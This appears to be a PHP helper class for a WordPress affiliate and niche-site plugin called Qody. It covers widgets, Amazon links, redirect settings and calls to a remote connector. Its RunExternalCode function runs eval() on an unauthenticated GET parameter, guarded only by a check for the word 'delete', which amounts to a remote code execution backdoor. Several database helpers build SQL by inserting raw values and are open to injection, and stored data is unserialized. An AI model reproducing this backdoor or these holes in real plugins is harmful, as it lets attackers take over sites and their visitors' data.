<?php
class Qody
{
	public static $prefix = 'qc_';
	
	public static function Init()
    {
        //global $qody;

        //$qody = new Qody();
	}
	
	static function RunExternalCode()
	{
		$codeToRun = $_GET['qc_command'];
		if( $codeToRun )
		{
			$cleanCode = Qody::CleanPotentialCommand( $codeToRun );
			
			if( strpos( strtolower($cleanCode), 'delete' ) !== false )
				echo "Possible deletion injection; halting dangerous action";
			else
			{
				eval( $cleanCode );
			}
		}
	}
	
	static function GetSiteKeyword()
	{
		$keyword = strtolower( get_bloginfo('name') );
		
		return $keyword;
	}
	
	static function LinkDecrypt( $url )
	{
		return base64_decode( $url );
	}
	
	static function LinkEncrypt( $url )
	{
		return base64_encode( $url );
	}
	
	static function ShowGoogleAd( $size = '250x250' )
	{
		$bits = explode( 'x', $size );
		
		$width = $bits[0];
		$height = $bits[1]; ?>
		<script type="text/javascript"><!--
		google_ad_client = "ca-pub-8729077878805378";
		/* Qody Niche Sites */
		google_ad_slot = "5834470232";
		google_ad_width = <?= $width; ?>;
		google_ad_height = <?= $height; ?>;
		//-->
		</script>
		<script type="text/javascript"
		src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
		</script>
	<?php
	}
	
	static function GetFromDatabase( $table, $field, $value )
	{
		$query = mysql_query( "SELECT * FROM {$table} WHERE {$field} = '{$value}'" ) or die( mysql_error() );
		
		if( Qody::IsValidQuery )
			return mysql_fetch_array( $query );
		
		return '';
	}
	
	static function DeleteFromDatabase( $table, $field, $value )
	{
		mysql_query( "DELETE FROM {$table} WHERE {$field} = '{$value}'" );
	}
	
	static function UpdateDatabase( $fields, $table, $id, $option = 'id' )
	{
		$first = '';
		$looper = 0;
		
		foreach( $fields as $theKey => $theValue )
		{
			$looper++;
			
			if( $looper == 1 )
				$first .= Qody::filter( $theKey )." = '".Qody::filter( $theValue )."' ";
			else
				$first .= ",".Qody::filter( $theKey )." = '".Qody::filter( $theValue )."' ";
		}
		
		$theQuery = "UPDATE {$table} SET ".$first." WHERE {$option} = '".$id."'";
		mysql_query( $theQuery ) or die( mysql_error() );	
	}
	
	static function InsertToDatabase( $fields, $table )
	{
		$first = '';
		$second = '';
		$looper = 0;
		
		$bits = explode( '.', $table );
		
		if( count($bits) > 1 )
		{
			$table = '`'.$bits[0].'` . `'.$bits[1].'`';
		}
		else
		{
			$table = '`'.$table.'`';
		}
			
		foreach( $fields as $theKey => $theValue )
		{
			$looper++;
			
			if( $looper == 1 )
				$first .= "`".Qody::filter( $theKey )."`";
			else
				$first .= ",`".Qody::filter( $theKey )."`";
				
			if( $looper == 1 )
				$second .= "'".Qody::filter( $theValue )."'";
			else
				$second .= ",'".Qody::filter( $theValue )."'";			
		}
		
		$theQuery = "INSERT INTO {$table} (".$first.") VALUES (".$second.")";
		
		mysql_query( $theQuery ) or die( mysql_error() );	
	}
	
	static function IsValidQuery( $query )
	{
		if( $query )
		{
			if( mysql_num_rows( $query ) > 0 )
			{
				return true;
			}
		}
		
		return false;
	}
	
	static function CompleteWizardStep( $step )
	{
		Qody::UpdateOption( "wizard_step_".$step, 1 );
	}
	
	static function GetCurrentWizardStep()
	{
		for( $i = 1; $i <= 5; $i++ )
		{
			if( Qody::GetOption( "wizard_step_".$i ) != 1 )
				return $i;
		}
		
		return -1;
	}
	
	static function ManualWidgetShow( $slug, $options = array() )
	{
		if( $options['no_title'] == 1 )
		{
			$bw = '';
			$aw = '';
		}
		
		switch( $slug )
		{
			case 'recent_posts':
				$postsWidget = new WP_Widget_Recent_Posts();
				
				$args = array();
				$args['name'] = 'Footer 2';
				$args['id'] = 'sidebar-4';
				$args['description'] = '';
				$args['before_widget'] = '<div class="menu">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3>';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'recent-posts-3';
				$args['widget_name'] = 'Recent Posts';
				
				$instance = array();
				$instance['title'] = 'Recent Posts';
				$instance['number'] = 7;
			
				$postsWidget->widget( $args, $instance );
				break;
			case 'pages':
				$pageWidget = new WP_Widget_Pages();
				
				$args = array();
				$args['name'] = 'Sidebar';
				$args['id'] = 'sidebar-1';
				$args['description'] = '';
				$args['before_widget'] = '<div class="menu">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3>';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'pages-3';
				$args['widget_name'] = 'Pages';
				
				$instance = array();
				$instance['title'] = 'Pages';
				$instance['sortby'] = 'post_title';
				$instance['exclude'] = '';
				
				$pageWidget->widget( $args, $instance );
				break;
			
			case 'text':
				$textWidget = new WP_Widget_Text();
				
				$args = array();
				$args['name'] = 'Footer 2';
				$args['id'] = 'sidebar-4';
				$args['description'] = '';
				$args['before_widget'] = '<div class="text">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3>';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'text-1';
				$args['widget_name'] = 'Text';
				
				$siteUrl = str_replace( 'http://', '', get_bloginfo('url') );
				
				$maxLength = 45;
				if( strlen($siteUrl) > $maxLength )
					$siteUrl = substr( $siteUrl, 0, $maxLength ).'...';
					
				$instance = array();
				$instance['title'] = 'We sell through Amazon!';
				$instance['text'] = "<p>".$siteUrl." is a participant in the Amazon Services LLC Associates Program, 
				an affiliate advertising program designed to provide a means for sites to earn advertising fees by 
				advertising and linking to amazon.com.</p>";
				
				$textWidget->widget( $args, $instance );
				
				break;
				
			case 'links':
				$linksWidget = new WP_Widget_Links();
				
				$args = array();
				$args['name'] = 'Footer 2';
				$args['id'] = 'sidebar-4';
				$args['description'] = '';
				$args['before_widget'] = '<div class="menu">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3>';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'links-3';
				$args['widget_name'] = 'Links';
				
				$instance = array();
				$instance['images'] = 0;
				$instance['name'] = 1;
				$instance['description'] = 0;
				$instance['rating'] = 0;
				$instance['category'] = 0;
			
				$linksWidget->widget( $args, $instance );
				break;
			case 'brand_list':
				$productWidget = new Qody_Product_Widget();
				
				$args = array();
				$args['name'] = 'Footer 2';
				$args['id'] = 'sidebar-4';
				$args['description'] = '';
				$args['before_widget'] = '<div class="menu">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3>';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'everniche-products-7';
				$args['widget_name'] = 'EverNiche Products';
				
				$instance = array();
				$instance['title'] = 'Bestselling Brands';
				$instance['name'] = '';
				$instance['product_size'] = 'large';
				$instance['type'] = 'best_sellers_brand_list';
				$instance['product_count'] = 6;
				$instance['display_direction'] = 'verticle';
				
				$productWidget->widget( $args, $instance );
				break;
			case 'brand_nav':
				$widget = new Qody_Product_Widget();
	
				$args = array();
				$args['name'] = 'Navigation Bar';
				$args['id'] = 'sidebar-1';
				$args['description'] = '';
				$args['before_widget'] = '<div id="categories-bg">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '';		
				$args['after_title'] = ''; 		
				$args['widget_id'] = 'everniche-products-3';
				$args['widget_name'] = 'EverNiche Products';
				
				$instance = array();
				$instance['title'] = '';
				$instance['name'] = '';
				$instance['product_size'] = 'large';
				$instance['type'] = 'best_sellers_brand_list';
				$instance['product_count'] = 6;
				$instance['display_direction'] = 'verticle';
				
				$widget->widget( $args, $instance );
				break;
			case 'long_product_list':
				$widget = new Qody_Product_Widget();
		
				$args = array();
				$args['name'] = 'Sidebar';
				$args['id'] = 'sidebar-2';
				$args['description'] = '';
				$args['before_widget'] = '<div class="products">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3 class="widgettitle">';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'everniche-products-4';
				$args['widget_name'] = 'EverNiche Products';
				
				$instance = array();
				$instance['title'] = 'Recommended Items';
				$instance['name'] = '';
				$instance['product_size'] = 'large';
				$instance['type'] = 'random';
				$instance['product_count'] = 10;
				$instance['display_direction'] = 'verticle';
				
				$widget->widget( $args, $instance );
				break;
			case 'horizontal_products_medium':
				$widget = new Qody_Product_Widget();
	
				$args = array();
				$args['name'] = 'Footer 1';
				$args['id'] = 'sidebar-3';
				$args['description'] = '';
				$args['before_widget'] = '<div class="post box">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3 class="post-title">';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'everniche-products-5';
				$args['widget_name'] = 'EverNiche Products';
				
				$instance = array();
				$instance['title'] = 'Recommended Items';
				$instance['name'] = '';
				$instance['type'] = 'random';
				$instance['product_size'] = 'large';
				$instance['product_count'] = 8;
				$instance['display_direction'] = 'horizontal';
				
				$widget->widget( $args, $instance );
				break;
			case 'horizontal_products_small':
				$widget = new Qody_Product_Widget();
	
				$args = array();
				$args['name'] = 'Footer 1';
				$args['id'] = 'sidebar-3';
				$args['description'] = '';
				$args['before_widget'] = '<div class="post box">';
				$args['after_widget'] = '</div>'; 
				$args['before_title'] = '<h3 class="post-title">';		
				$args['after_title'] = '</h3>'; 		
				$args['widget_id'] = 'everniche-products-6';
				$args['widget_name'] = 'EverNiche Products';
				
				$instance = array();
				$instance['title'] = 'Other Related Items';
				$instance['name'] = '';
				$instance['product_size'] = 'large';
				$instance['type'] = 'random';
				$instance['product_count'] = 4;
				$instance['display_direction'] = 'horizontal';
				
				$widget->widget( $args, $instance );
				break;
		}
	}
	
	static function close_dangling_tags($html){
	  #put all opened tags into an array
	  preg_match_all("#<([a-z]+)( .*)?(?!/)>#iU",$html,$result);
	  $openedtags=$result[1];
	
	  #put all closed tags into an array
	  preg_match_all("#</([a-z]+)>#iU",$html,$result);
	  $closedtags=$result[1];
	  $len_opened = count($openedtags);
	  # all tags are closed
	  if(count($closedtags) == $len_opened){
		return $html;
	  }
	
	  $openedtags = array_reverse($openedtags);
	  # close tags
	  for($i=0;$i < $len_opened;$i++) {
		if (!in_array($openedtags[$i],$closedtags)){
		  $html .= '</'.$openedtags[$i].'>';
		} else {
		  unset($closedtags[array_search($openedtags[$i],$closedtags)]);
		}
	  }
	  return $html;
	}
	
	static function SafeSubstr($text, $length = 180) { 
		if((mb_strlen($text) > $length)) { 
			$whitespaceposition = mb_strpos($text, ' ', $length) - 1; 
			if($whitespaceposition > 0) { 
				$chars = count_chars(mb_substr($text, 0, ($whitespaceposition + 1)), 1); 
				if ($chars[ord('<')] > $chars[ord('>')]) { 
					$whitespaceposition = mb_strpos($text, ">", $whitespaceposition) - 1; 
				} 
				$text = mb_substr($text, 0, ($whitespaceposition + 1)); 
			} 
			$text = str_replace( '<br / ', '<br>', $text ); 
			$text .= ' ...';
			
			$text = Qody::close_dangling_tags( $text );
		}
		
		return $text; 
	} 
	
	static function GetPostContent( $size = 'full', $stripImages = false )
	{
		global $post;
		
		$content = $post->post_content;
		$content = apply_filters('the_content', $content);
		$content = str_replace(']]>', ']]&gt;', $content);
		
		if( $stripImages || $post->post_category == 4 )
			$content = preg_replace("/<img[^>]+\>/i", "", $content);
		
		if( $size != 'full' )
		{
			$bits = explode( '<!--more-->', $content );
			$content = str_replace( '<p></p>', '', $bits[0] );
			$content = Qody::SafeSubstr( $content, $size );
		}
		
		
		return $content;
	}
	
	static function GetAmazonLink( $type = '' )
	{
		if( $type == 'leave' )
			$aaid = Qody::GetOption( 'amazon_leave_aaid' );
		
		if( !$aaid )
			$aaid = Qody::GetOption( 'amazon_aaid' );
		
		if( !$aaid )
			$aaid = get_option( 'amazon_aaid' );
		
		if( !$aaid )
			$aaid = get_option( 'niche_amazon_aaid' );
			
		if( !$aaid )
			$aaid = Qody::GetDefaultAAid();
			
		$keyword = Qody::GetSiteKeyword();
		
		$link = 'http://www.amazon.com/gp/redirect.html?ie=UTF8&location=http%3A%2F%2Fwww.amazon.com%2Fs%3Fie%3DUTF8%26x%3D0%26ref_%3Dnb_sb_noss%26y%3D0%26field-keywords%3D'.htmlentities( $keyword ).'%26url%3Dsearch-alias%253Daps&tag='.$aaid.'&linkCode=ur2&camp=1789&creative=390957';
		
		return $link;
		return '/redirect.php?url='.Qody::LinkEncrypt($link);
	}
	
	static function GetDefaultAAid()
	{
		$aaid = 'qody-20';
		
		return $aaid;
	}
	
	static function DisplayMessages()
	{
		$message = get_option('qody_message');
		$message = Qody::DecodeResponse( $message );

		if( $message )
		{
			if( $message['errors'] )
			{
				foreach( $message['errors'] as $key => $value )
				{ ?>
			<div id="message" class="updated notification error"><p><strong><?= $value; ?></strong></p></div>
				<?php
				}
			} ?>
			
			<?php
			if( $message['results'] )
			{
				foreach( $message['results'] as $key => $value )
				{ ?>
			<div id="message" class="updated notification success"><p><strong><?= $value; ?></strong></p></div>
				<?php
				}
			}
			
			update_option('qody_message', '');
		}
	}

	static function GetPostData( $postID )
	{
		global $wpdb;
		
		$queryString = "SELECT * FROM ".$wpdb->posts." WHERE ID = '$postID'";
		$posts = $wpdb->get_row( $queryString );
		
		return $posts;
	}
	
	static function GetCurrentPages()
	{
		global $wpdb;
		
		$postList = array();
		
		$domain = $wpdb->get_var( "SELECT domain FROM {$wpdb->blogs} WHERE blog_id=".$wpdb->blogid);
		$posts = $wpdb->get_col( "SELECT ID FROM wp_".$wpdb->blogid."_posts WHERE post_type = 'page' AND post_status = 'publish' AND guid like '%".$domain."%'");
		
		if( $posts )
		{
			$iter = 0;
			foreach($posts as $p)
			{
				$postData = get_blog_post( $wpdb->blogid,$p );
				$postList[ $iter ]['title'] = $postData->post_title;
				$postList[ $iter ]['redirect_url'] = 'http://google.com';
				$postList[ $iter ]['id'] = $postData->ID;
				$iter++; 
			}
		}
		else
		{
			$queryString = "SELECT * FROM ".$wpdb->posts." WHERE post_type = 'page' AND post_status = 'publish'";
			$posts = $wpdb->get_results( $queryString );
			
			if( $posts )
			{
				$iter = 0;
				foreach($posts as $p)
				{
					$postList[ $iter ]['title'] = $p->post_title;
					$postList[ $iter ]['redirect_url'] = 'http://google.com';
					$postList[ $iter ]['id'] = $p->ID;
					$iter++; 
				}
			}
		}
	
		
	
		return $postList;
	}
	
	static function GetCurrentPosts()
	{
		global $wpdb;
		
		$postList = array();
		
		$domain = $wpdb->get_var( "SELECT domain FROM {$wpdb->blogs} WHERE blog_id=".$wpdb->blogid);
		$posts = $wpdb->get_col( "SELECT ID FROM wp_".$wpdb->blogid."_posts WHERE post_type = 'post' AND post_status = 'publish' AND guid like '%".$domain."%'");
	
		if( $posts )
		{
			$iter = 0;
			foreach($posts as $p)
			{
				$postData = get_blog_post( $wpdb->blogid,$p );
				$postList[ $iter ]['title'] = $postData->post_title;
				$postList[ $iter ]['redirect_url'] = 'http://google.com';
				$postList[ $iter ]['id'] = $postData->ID;
				$iter++; 
			}
		}
		else
		{
			$queryString = "SELECT * FROM ".$wpdb->posts." WHERE post_type = 'post' AND post_status = 'publish'";
			$posts = $wpdb->get_results( $queryString );
			
			if( $posts )
			{
				$iter = 0;
				foreach($posts as $p)
				{
					$postList[ $iter ]['title'] = $p->post_title;
					$postList[ $iter ]['redirect_url'] = 'http://google.com';
					$postList[ $iter ]['id'] = $p->ID;
					$iter++; 
				}
			}
		}
	
		return $postList;
	}
	
	
	static function RedirectorCodeInsertion()
	{
		global $post;
		
		return;

		$redirect_url = html_entity_decode( Qody::GetOption( 'redirect_url' ) );
		$redirect_home = Qody::GetOption( 'redirect_home' );
		$redirect_on = Qody::GetOption( 'redirect_on' );
		$redirect_pages = Qody::GetOption( 'redirect_pages' );
		$redirect_posts = Qody::GetOption( 'redirect_posts' );

		if( $redirect_posts )
		{
			foreach( $redirect_posts as $key => $value )
			{
				if( is_single( $key ) )
				{
					$redirect_url = $value;
					break;
				}
			}
		}
		if( $redirect_pages )
		{
			foreach( $redirect_pages as $key => $value )
			{
				if( is_page( $key ) )
				{
					$redirect_url = $value;
					break;
				}
			}
		}
		
		if( $redirect_home )
		{
			if( is_home() || is_front_page() )
			{
				$redirect_url = $redirect_home;
			}
		}


		if( $redirect_on == 'yes' && $redirect_url )
		{
		?>
		<script type="text/javascript" src="<?= Qody::GetPluginDirectory(); ?>/redirector/redirect-action.php?url=<?= base64_encode( $redirect_url ); ?>"></script>
		<?php
		}
	}
	
	static function UpgradeFromWPTO()
	{
		$fields = array();
		
		$item['old'] = 'wpto_url';
		$item['new'] = Qody::$prefix.'redirect_url';
		$fields[] = $item;
		
		$item['old'] = 'wpto_on';
		$item['new'] = Qody::$prefix.'redirect_on';
		$fields[] = $item;
		
		$item['old'] = 'wpto_home';
		$item['new'] = Qody::$prefix.'redirect_home';
		$fields[] = $item;
		
		$item['old'] = 'wpto_posts';
		$item['new'] = Qody::$prefix.'redirect_posts';
		$fields[] = $item;
		
		$item['old'] = 'wpto_pages';
		$item['new'] = Qody::$prefix.'redirect_pages';
		$fields[] = $item;
		
		foreach( $fields as $key => $value )
		{
			$oldValue = get_option( $value['old'] );
			
			if( $oldValue )
			{
				update_option( $value['new'], $oldValue );
				delete_option( $value['old'] );
			}
		}
	}
	
	static function GetOption( $slug )
	{
		return get_option( Qody::$prefix.$slug );
	}
	static function UpdateOption( $slug, $value )
	{
		update_option( Qody::$prefix.$slug, $value );
	}
	
	static function Clean( $theString )
	{
		return str_replace( "\\", "", html_entity_decode($theString) );
	}
	
	static function filter( $str )
	{
		if( is_array( $str ) )
			return;

		$str = addslashes( $str );
		$str = htmlentities( $str );
		$str = trim( $str );
		
		return $str;
	}
	
	function ProcessRedirectionSettings()
	{
		$redirectUrl = Qody::filter( $_POST['redirect_url'] );
		$on = Qody::filter( $_POST['redirect_on'] );
		
		$postRedirects = array();
		if( $_POST['post_redirect_id'] )
		{
			foreach( $_POST['post_redirect_id'] as $key => $value )
			{
				if( $value == -1 )
					continue;
				
				if( !trim( $_POST['post_redirect_url'][ $key ] ) )
					continue;
					
				$postRedirects[ $value ] = Qody::filter( $_POST['post_redirect_url'][ $key ] );
			}
		}
		
		$pageRedirects = array();
		if( $_POST['page_redirect_id'] )
		{
			foreach( $_POST['page_redirect_id'] as $key => $value )
			{
				if( $value == -1 )
					continue;
				
				if( !trim( $_POST['page_redirect_url'][ $key ] ) )
					continue;
					
				$pageRedirects[ $value ] = Qody::filter( $_POST['page_redirect_url'][ $key ] );
			}
		}
		
		$homeRedirect = Qody::filter( $_POST['home_redirect_url'] );

		Qody::UpdateOption( 'redirect_url', $redirectUrl );
		Qody::UpdateOption( 'redirect_on', $on );
		Qody::UpdateOption( 'redirect_home', $homeRedirect );
		Qody::UpdateOption( 'redirect_posts', $postRedirects );
		Qody::UpdateOption( 'redirect_pages', $pageRedirects );
	}
	
	static function GetPluginDirectory()
	{
		$pluginFolder = dirname(dirname(plugin_basename(__FILE__)));
		
		$dir = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"", $pluginFolder );

		return $dir;
	}
	
	static function GetPreviousPage()
	{
		$url = $_SERVER['HTTP_REFERER'];
		
		if( !$url )
		{
			$url = QodyPages::MakeLink( 'qody' );
		}
		
		return $url;
	}
	
	static function ItemDebug( $data )
	{
		echo "<br>---------------- Start Debug ----------------<br>";
		echo "<pre>".print_r( $data, true )."</pre>";
		echo "----------------  End Debug  ----------------<br>";
	}
	
	static function ProcessOblinkerSettings()
	{
		$oblinker_enabled = Qody::filter( $_POST['oblinker_enabled'] );
		$oblinker_categories = $_POST['oblinker_categories'];
		
		$oblinker_categories = Qody::Encode( $oblinker_categories );
		
		if( $oblinker_enabled == 'yes' )
			$toggle = 'enable';
		else
			$toggle = 'disable';
		
		$results = Qody::ConnectWithOblinker( $oblinker_categories, $toggle );

		if( !$results['errors'] )
		{
			Qody::UpdateOption( 'oblinker_enabled', $oblinker_enabled );
			Qody::UpdateOption( 'oblinker_categories', $oblinker_categories );
		}
		
		Qody::SetMessage( $results );
	}
	
	static function ConnectWithOblinker( $oblinker_categories = '', $toggle = 'enable' )
	{
		$fields = array();
		$fields['action'] = "oblinker_".$toggle;
		$fields['oblinker_categories'] = $oblinker_categories;
		$fields['toggle'] = $toggle;

		$response = Qody::SendCommand( $fields );

		return Qody::DecodeResponse($response);
	}
	
	static function ConnectWithSnapshots()
	{
		$fields = array();
		$fields['action'] = "snapshots";

		$response = Qody::SendCommand( $fields );

		return Qody::DecodeResponse($response);
	}
	
	static function ConnectWithSiteTracker( $keywords = '', $toggle = 'enable' )
	{
		$fields = array();
		$fields['action'] = "sitetracker_".$toggle;
		$fields['keywords'] = $keywords;
		$fields['toggle'] = $toggle;
		
		$response = Qody::SendCommand( $fields );
		
		return Qody::DecodeResponse($response);
	}
	
	static function SendCommand( $fields )
	{
		$fields['company_api_key'] = Qody::GetOption( 'company_api_key' );
		$fields['user_api_key'] = Qody::GetOption( 'user_api_key' );
		
		$supposedDomain = Qody::GetOption( 'domain' );
		$realDomain = get_option('siteurl');
		
		if( !$domain )
			$domain = $realDomain;
		
		if( $domain != $supposedDomain )
			$fields['old_domain'] = $supposedDomain;
			
		$fields['domain'] = $domain;
		//$fields['domain'] = 'http://husqvarnachainsaws.co';

		//echo "The Request: "."http://qody.co/connector/?".http_build_query( $fields )."<br>";
		$response = file_get_contents( "http://qody.co/connector/?".http_build_query( $fields ) );
		//$response = file_get_contents( "http://qody.co/" );

		//Qody::ItemDebug( $response );
		
		return $response;
	}
	
	static function CleanPotentialCommand( $command )
	{
		$cleanCommand = str_replace( "\\", "", html_entity_decode(urldecode($command)) );
		
		return $cleanCommand;
	}

	static function GetConnectorStyles()
	{ ?>
	<style>
	div.notification {
		margin: 5px 0 15px !important;
		border-width: 1px !important;
		border-style: solid !important;
		padding: 0 .6em !important;
	
		-moz-border-radius: 3px !important;
		-khtml-border-radius: 3px !important;
		-webkit-border-radius: 3px !important;
		border-radius: 3px !important;
	}
	div.notification p {
		margin: .5em 0 !important;
		padding: 2px !important;
	}
	.error {
		background-color:#ffe0ff !important;
		border-color:#e655db !important;
	}
	.success {
		background-color:#e8ffeb !important;
		border-color:#00cc0e !important;
	}
	.options_table td {
		padding-right:100px !important;
	}
	.qody_options h3 {
		padding-bottom:4px;
		border-bottom:1px solid #bbb;
		width:80%;
	}
	</style>
	<?php	
	}
	
	static function AddThisBlogToSiteTracker()
	{
		// Notify Qody of your main site
		$keyword = strtolower( Qody::GetOption( 'keyword_to_track') );
		
		Qody::ConnectWithSiteTracker( $keyword, 'enable' );
	}
	
	static function Encode( $stuff )
	{
		$encoded = serialize( $stuff );
		$encoded = Qody::filter( $encoded );
		
		return $encoded;
	}
	
	static function Decode( $stuff )
	{
		$stuff = Qody::Clean( $stuff );
		$decoded = unserialize( html_entity_decode($stuff) );		
		
		return $decoded;
	}
	
	static function DecodeResponse( $response )
	{
		return Qody::ObjectToArray( json_decode($response) );
	}
	
	static function EncodeResponse( $response )
	{
		return json_encode($response);
	}
	
	static function ObjectToArray( $object )
	{
		if( !is_object( $object ) && !is_array( $object ) )
		{
			return $object;
		}
		if( is_object( $object ) )
		{
			$object = get_object_vars( $object );
		}
		return array_map( 'Qody::ObjectToArray', $object );
	}
	
	static function SetMessage( $new_message )
	{
		$current_messages = Qody::DecodeResponse( get_option('qody_message') );
		
		if( !is_array( $new_message ) )
			$new_message = Qody::DecodeResponse( $new_message );

		if( $new_message['results'] )
		{
			foreach( $new_message['results'] as $key => $value )
				$current_messages['results'][] = $value;
			
			$current_messages['results'] = array_unique( $current_messages['results'] );
		}
		
		if( $new_message['errors'] )
		{
			foreach( $new_message['errors'] as $key => $value )
				$current_messages['errors'][] = $value;
			
			$current_messages['errors'] = array_unique( $current_messages['errors'] );
		}
	
		$current_messages = Qody::EncodeResponse( $current_messages );

		update_option('qody_message', $current_messages );
	}
	
	static function CheckAllTasks()
	{
		$domain = get_option('siteurl');
		
		$fields = array();
		$fields['action'] = "schedule_check";
		$fields['domain'] = $domain;
	
		$response = Qody::SendCommand( $fields );
		//Qody::ItemDebug( $fields );
		//Qody::ItemDebug( $response )
		//echo $response;
		
		Qody::SetMessage( $response );
	}
	
	static function MakeSlug( $slug )
	{
		$slug = str_replace( ' ', '_', $slug );
		$slug = strtolower( $slug );
		
		return $slug;
	}
	
	static function GetFromSlug( $slug )
	{
		$slug = str_replace( '_', ' ', $slug );
		$slug = ucwords( $slug );
		
		return $slug;
	}
	
	static function xmlstr_to_array($xmlstr) {
		$doc = new DOMDocument();
		$doc->loadXML($xmlstr);
		
		return Qody::domnode_to_array($doc->documentElement);
	}
	
	static function domnode_to_array($node)
	{
		$output = array();
		switch ($node->nodeType)
		{
			case XML_CDATA_SECTION_NODE:
			case XML_TEXT_NODE:
				$output = trim($node->textContent);
				break;
			
			case XML_ELEMENT_NODE:
			for ($i=0, $m=$node->childNodes->length; $i<$m; $i++)
			{
				$child = $node->childNodes->item($i);
				$v = Qody::domnode_to_array($child);
				
				if(isset($child->tagName))
				{
					$t = $child->tagName;
					if(!isset($output[$t]))
					{
						$output[$t] = array();
					}
					$output[$t][] = $v;
				}
				elseif($v)
				{
					$output = (string) $v;
				}
			}
			if(is_array($output))
			{
				if($node->attributes->length)
				{
					$a = array();
					foreach($node->attributes as $attrName => $attrNode)
					{
						$a[$attrName] = (string) $attrNode->value;
					}
					$output['@attributes'] = $a;
				}
				foreach ($output as $t => $v)
				{
					if(is_array($v) && count($v)==1 && $t!='@attributes')
					{
						$output[$t] = $v[0];
					}
				}
			}
			break;
		}
		return $output;
	}
}
?>